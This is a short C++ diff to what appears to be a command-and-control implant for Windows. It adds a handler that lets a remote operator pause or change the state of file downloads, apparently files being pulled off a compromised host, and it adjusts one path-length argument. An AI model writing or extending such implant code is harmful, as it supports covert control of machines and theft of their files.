@@ -29,6 +29,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_DOWNLOAD:
 			this->CmdDownload(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_DOWNLOAD_STATE:
+			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
 		
@@ -82,12 +85,39 @@ void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker
 			outPacker->Pack32(downloadData.fileId);
 			outPacker->Pack8(DOWNLOAD_START);
 			outPacker->Pack32(downloadData.fileSize);
-			outPacker->PackBytes((PBYTE)fullPath, pathSize - 1);
+			outPacker->PackBytes((PBYTE)fullPath, pathSize);
 		}
 		else {
 			outPacker->Pack32(COMMAND_ERROR);
 			outPacker->Pack32(TEB->LastErrorValue);
 		}
+	}
+}
+
+void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG newState = inPacker->Unpack32();
+	ULONG fileId   = inPacker->Unpack32();
+	ULONG taskId   = inPacker->Unpack32();
+
+	bool  found    = false;
+	for (int i = 0; i < this->agent->downloader->downloads.size(); i++) {
+		if (this->agent->downloader->downloads[i].fileId == fileId) {
+			this->agent->downloader->downloads[i].state = newState;
+			found = true;
+			break;
+		}
+	}
+
+	outPacker->Pack32(taskId);
+	if (found) {
+		outPacker->Pack32(COMMAND_DOWNLOAD_STATE);
+		outPacker->Pack32(fileId);
+		outPacker->Pack8((BYTE)newState);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(2);
 	}
 }
 
